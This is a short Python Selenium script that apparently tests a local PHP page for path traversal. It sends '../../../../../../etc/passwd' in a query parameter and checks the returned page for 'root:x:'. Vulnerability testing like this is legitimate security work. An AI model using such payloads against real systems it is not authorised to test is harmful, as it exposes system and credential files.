from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile

# Setting the path for the geckodriver
geckodriver_path = "/usr/local/bin/geckodriver"

# Configuring options for the Firefox browser
options = Options()

# Specifying a custom Firefox profile for the browser session
options.add_argument("-profile")
options.add_argument("/home/pranjali/firefox_profile")

# Specifying the binary location of the Firefox browser
options.binary_location = "/usr/bin/firefox"

# Configuring the service for the geckodriver
service = Service(executable_path=geckodriver_path)
options.headless = True  

# Initializing the Firefox browser with the specified configurations
driver = webdriver.Firefox(service = service, options=options)

try:
   
    base_url = "https://localhost/get_req.php"
    name = "Pranjali"
    email = "pranjali@example.com"
    # Payload to test for path traversal vulnerability
    payload = "../../../../../../etc/passwd"

    # Constructing a malicious URL with the potential payload
    malicious_url = f"{base_url}?name={name}&email={email}&cont={payload}"

    driver.get(malicious_url)

    page_source = driver.page_source


    if "root:x:" in page_source:
        print("Vulnerability detected: Path traversal successful.")
    else:
        print("Vulnerability not detected or the payload did not work.")

finally:
    driver.quit()